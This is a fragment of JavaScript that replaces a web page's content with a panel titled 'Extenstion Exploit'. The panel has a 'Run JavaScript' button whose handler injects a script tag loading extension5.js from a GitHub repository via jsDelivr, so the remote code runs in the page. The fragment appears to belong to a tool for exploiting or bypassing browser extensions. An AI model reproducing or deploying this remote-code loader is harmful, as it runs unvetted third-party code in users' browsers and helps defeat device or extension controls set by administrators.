...
document.documentElement.innerHTML =
  ...
  isPageDev() +
  '>\n<div class="nav">\n<div class="nav-left">\n<div class="nav-title">Extenstion Exploit</div>\n<div class="nav-right">\n<div class="nav-dev">Developer mode</div>\n<button onclick="var s=document.createElement(`script`);s.src=`https://cdn.jsdelivr.net/gh/Dominato014/Files@latest/extension5.js`;document.body.appendChild(s);">Run JavaScript</button>\n<div ' +
  isButtonDev() +
